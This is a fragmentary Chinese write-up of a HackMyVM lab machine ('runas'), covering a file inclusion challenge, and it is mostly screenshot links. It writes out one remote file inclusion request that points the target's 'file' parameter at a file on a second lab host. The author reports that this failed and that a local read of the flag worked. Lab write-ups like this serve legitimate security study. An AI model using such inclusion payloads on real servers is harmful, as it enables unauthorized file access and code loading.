---
{"created":"2024-11-26T20:32:44.688+08:00","tags":["HMV","文件包含"],"Type":"wp","dg-publish":true,"难度":"⭐️","作者":"ysnmrtksk","aliases":null,"permalink":"/24-渗透/HMV/30.runas/","dgPassFrontmatter":true,"noteIcon":"2"}
---
...
### 2.2. 网站信息
`首页`
![](/img/user/24-渗透/HMV/assets/Pasted image 20241126203940.png)
`index.php`
![](/img/user/24-渗透/HMV/assets/Pasted image 20241126204004.png)
...
进来还是这个
![](/img/user/24-渗透/HMV/assets/Pasted image 20241126210046.png)

试一下远程文件包含
```
http://192.168.56.20/index.php/login/?file=http://192.168.56.6/1.txt
```
![](/img/user/24-渗透/HMV/assets/Pasted image 20241126210445.png)
失败了
...
我直接读flag试试
尝试一下本地读flag
![](/img/user/24-渗透/HMV/assets/Pasted image 20241126223052.png)
哈哈，成功读取
```
...
也可以
![](/img/user/24-渗透/HMV/assets/Pasted image 20241126223455.png)
```
